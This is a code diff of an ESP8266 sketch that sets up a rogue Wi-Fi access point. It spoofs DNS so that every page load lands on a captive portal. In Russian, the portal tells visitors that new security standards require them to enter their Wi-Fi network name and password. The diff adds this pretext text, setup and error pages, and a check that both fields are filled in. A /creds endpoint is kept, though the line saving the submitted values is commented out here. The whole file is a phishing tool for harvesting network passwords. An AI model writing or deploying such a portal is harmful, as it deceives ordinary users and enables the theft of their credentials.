@@ -7,7 +7,7 @@
 #include <ESP8266WebServer.h>
 
 // User configuration
-#define SSID_NAME "Free WI-FI"
+#define SSID_NAME "AVA"
 #define SUBTITLE "Авторизация точки доступа в сети интернет."
 #define TITLE "Подключение:"
 #define BODY "Введите название точки доступа и её пароль."
@@ -15,6 +15,11 @@
 #define POST_BODY "Ваша точка доступа WI-FI авторизирована. Подождите пожалуйста 5 минут для завершения валидации.</br>Спасибо Вам."
 #define PASS_TITLE "Credentials"
 #define CLEAR_TITLE "Cleared"
+#define SETUP_TITLE "Авторизация WiFi в соответствии с новыми стандартами безопасности."
+#define SETUP_BODY "Для соответствия новым требованиям безопасности выполните авторизацию WiFi."
+#define SETUP_BUTTON "Пройти настройку"
+#define ERROR_TITLE "Ошибка авторизации"
+#define ERROR_BODY "Пожалуйста, введите имя сети WiFi и пароль."
 
 // Init System Settings
 const byte HTTP_CODE = 200;
@@ -32,7 +37,17 @@ String input(String argName) {
   a.substring(0,200); return a; }
 
 String footer() { return 
-  "</div><div class=q><a>&#169; Иваново. Все права защищены.</a></div>";
+  "</div><div class=q><a>&#169; Ростов. Все права защищены.</a></div>";
+}
+
+String setupPage() {
+  return header(SETUP_TITLE) + "<div>" + SETUP_BODY + "</div><div><form action=/setup method=post>" +
+    "<input type=submit value=\"" + SETUP_BUTTON + "\"></form></div>" + footer();
+}
+
+String errorPage() {
+  return header(ERROR_TITLE) + "<div>" + ERROR_BODY + "</div><div><form action=/setup method=post>" +
+    "<input type=submit value=\"" + SETUP_BUTTON + "\"></form></div>" + footer();
 }
 
 String header(String t) {
@@ -40,7 +55,7 @@ String header(String t) {
   String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
     "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
     "div { padding: 0.5em; }"
-    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
+    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; line-height: 1.1; }"
     "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
     "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
     "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
@@ -60,7 +75,7 @@ String creds() {
 String index() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
     "<b>WI-FI:</b> <center><input type=text autocomplete=email name=email></input></center>" +
-    "<b>Пароль:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
+    "<b>Пароль:</b> <center><input type=password name=password></input><input type=submit value=\"Авторизировать\"></form></center>" + footer();
 }
 
 String posted() {
@@ -94,10 +109,21 @@ void setup() {
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(SSID_NAME);
   dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
-webServer.on("/post",[]() { 
-    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
-    webServer.send(HTTP_CODE, "text/html", posted()); 
-    BLINK(); 
+
+  webServer.on("/post",[]() { 
+      String email=input("email");
+      String password=input("password");
+      
+      if(email == "" || password == "") {
+          webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
+          webServer.send(HTTP_CODE, "text/html", errorPage());
+          return;
+      }
+      
+      // Credentials="<li>WI-FI: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
+      webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
+      webServer.send(HTTP_CODE, "text/html", posted()); 
+      BLINK(); 
   });
 
   webServer.on("/creds",[]() { 
@@ -110,10 +136,15 @@ webServer.on("/post",[]() {
     webServer.send(HTTP_CODE, "text/html", clear()); 
   });
 
+  webServer.on("/setup",[]() { 
+    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
+    webServer.send(HTTP_CODE, "text/html", index()); 
+  });
+
   webServer.onNotFound([]() { 
     lastActivity=millis(); 
     webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
-    webServer.send(HTTP_CODE, "text/html", index()); 
+    webServer.send(HTTP_CODE, "text/html", setupPage()); 
   });
 
   webServer.begin();
